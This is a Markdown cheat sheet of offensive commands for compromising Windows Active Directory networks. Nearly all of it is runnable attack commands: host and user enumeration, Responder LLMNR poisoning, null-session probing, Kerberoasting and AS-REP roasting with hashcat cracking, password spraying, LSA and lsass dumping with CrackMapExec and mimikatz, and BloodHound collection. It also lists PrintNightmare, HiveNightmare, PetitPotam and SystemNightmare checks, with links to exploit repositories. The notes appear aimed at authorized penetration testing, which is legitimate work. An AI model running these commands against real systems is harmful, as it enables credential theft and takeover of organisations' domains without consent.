# Enumeration

- Enumerate hosts
```
cme smb 192.168.1.0/24
```
- Locate Domain Controller
```
nmap -p 389 -T4 -A -v --script ldap-rootdse 10.10.10.10/10

or:

cmd.exe
nslookup
set type=all
_ldap._tcp.dc._msdcs.<DOMAIN> 
```
- LLMNR/NBT-NS poisoning to grab hashes
```
sudo python3 responder.py -I eth0 -wF -v
```
- try adding `--lm` as well to see if you can downgrade and do a PTH attack
- Null sessions to grab usernames
```
cme smb 10.10.10.10 -u '' -p '' --users
cme smb 10.10.10.10 -u '' -p '' --shares
cme smb 10.10.10.10 -u '' -p '' --logged-users / --loggedon-users
```
- Kerberoast with CME
```
cme ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
hashcat -m13100 output.txt wordlist.txt
```
- ASREPRoast with CME
```
cme ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
cme ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
cme ldap 192.168.0.104 -u harry -p pass --asreproast output.txt

To specify DC IP:
cme ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost ip_dc

Cracking:
hashcat -m18200 output.txt wordlist
```
- Password spray with `Password1`
- Grab LSA secrets with CME as DA
```
Requires Domain Admin or Local Admin Priviledges on target Domain Controller:
cme smb 192.168.1.0/24 -u '' -p '' --lsa
```
- Check SMB shares:
	- `smbmap -H 192.168.1.40`
- Check SMB anonymous logon:
```
cme smb 10.10.10.178 -u 'a' -p ''
```
- Check SMB vulns:
	- `nmap --script smb-vuln* 192.168.1.16`
- User enumeration on SMB:	
```
use auxiliary/scanner/smb/smb_lookupsid
set rhosts 192.168.1.17
set smbuser raj
set smbpass 123
exploit
```


# Windows post-exploitation
- Check for WinrRM so you can do PSRemoting or Evil-Winrm with low priv users
```
nmap -p 5985,5986 -sV 10.10.10.0/24
```
- Dump lsass with CrackMapExec
```
cme smb 192.168.255.131 -u administrator -p pass -M lsassy
```
	- Run Bloodhound remotely:
	```
	runas /netonly /user:DOMAIN\username powershell
	# Enter password when prompted, then:

	cd C:/Pentest/Tools/
	Powershell -exec bypass
	Import-module .\SharpHound.ps1
	Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -domain <DOMAIN> -DomainController 10.10.10.10
	```
- Run mimikatz from CrackMapExec
```
cme 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
cme smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"sekurlsa::logonpasswords"
```
- Do the credential shuffle.
	- dump lsass of other boxes with the creds you already obtained until you find admins/DAs
- Check user descriptions for passwords:
```
Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description.length -gt 8 }
```
- Dump all usernames in domain to password spray again:
```
Get-ADuser -filter * -Properties SamAccountName | Select-Object SamAccountName
```
- kerberoast/ASREPRoast and crack offline
	- Check previous section for commands
- Check if if print spooler service is running
```
	Get-Service -Name spooler
```
- if print spooler service is running then try:
	- printNightmare 1-4
	- https://github.com/cube0x0/CVE-2021-1675/
	- https://github.com/calebstewart/CVE-2021-1675
```
1) Set SMB config in /etc/samba/smb.conf copying from Cune0x0 repo
# Check that both services are running on Kali to get samba share working
systemctl status smbd
systemctl status nmbd
```
Start service if not started

- Check hiveNightmare:
```
icacls c:\windows\system32\config\sam
```
If `BUILTIN\Users:(I)(RX)` then it's vulnerable
	- Exploitation: https://github.com/GossiTheDog/HiveNightmare
- PetitPotam
	- Requires local admin
	- Requires knowledge of DC IP
	- https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/
- SystemNightmare
	- https://github.com/GossiTheDog/SystemNightmare
	- run the two commands on the .bat file - gives you a SYSTEM cmd prompt
- [ ] Mimikatz
	- sekurlsa dump
- [ ] winPEAS
- [ ] SeatBelt
- [ ] Watson
- [ ] PowerUp
